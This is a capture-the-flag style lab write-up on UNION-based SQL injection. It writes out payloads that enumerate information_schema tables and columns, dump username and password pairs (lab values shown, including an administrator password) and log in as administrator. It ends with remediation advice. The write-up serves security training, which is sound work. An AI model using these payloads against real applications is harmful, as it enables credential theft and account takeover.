# Lab: SQL injection attack, listing the database contents on non-Oracle databases

**Category:** SQL Injection\
**Difficulty:** Practitioner\
**Objective:** Find the table holding usernames and passwords, extract its contents, and log in as the administrator

## 0. Attacker mindset

The database has a table with user credentials, but its name and column names are unknown. I need to query `information_schema.tables` to discover the table, then `information_schema.columns` to discover its columns, and finally extract the data.

## 1. What is the vulnerability?

The product category filter passes user input directly into a SQL query. An attacker can user UNION injection to query the database metadata (`information_schema`) and then extract data from any table.

## 2. How did I exploit it?

### Step 1 - Discover the users table

`'+UNION+SELECT+NULL,CONCAT(table_schema,'.',table_name)+FROM+information_schema.tables--`
Scanned the output and identified a table named `users_bsbvuo`

### Step 2 - Discover its columns
`'+UNION+SELECT+NULL,CONCAT(column_name,'.',data_type)+FROM+information_schema.columns+WHERE+table_name='users_bsbvuo'--`
Output revealed the relevant columns:
- `username_nbohkb` (character varying)
- `password_bbcjet` (character varying)

### Step 3 - Extract all credentials
`+UNION+SELECT+NULL,CONCAT(username_nbohkb,'~',password_bbcjet)+FROM+users_bsbvuo--`
Output:
- `carlos~bth1r8tfulcmvvgy9hql`
- `wiener~1ymhisnu72f16kwhwi7a`
- `administrator~fmc2xnsyz31wgwobo9t7`

### Step 4 - Log in
Used `administrator`:`fmc2xnsyz31wgwobo9t7`. Lab solved.

## 3. Impact

- Complete enumeration fo the database schema via `information_schema`
- Full extraction of user credentials, including the administrator account
- Demonstrates that an attacker with SQL injection can discover any table and column name, bypassing the need to guess them

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) for all database access
- Do not concatenate user input into SQL strings
- Restrict the privileges of the database account used by the application
  (e.g., revoke access to `information_schema` if not needed)
- Hash and salt stored passwords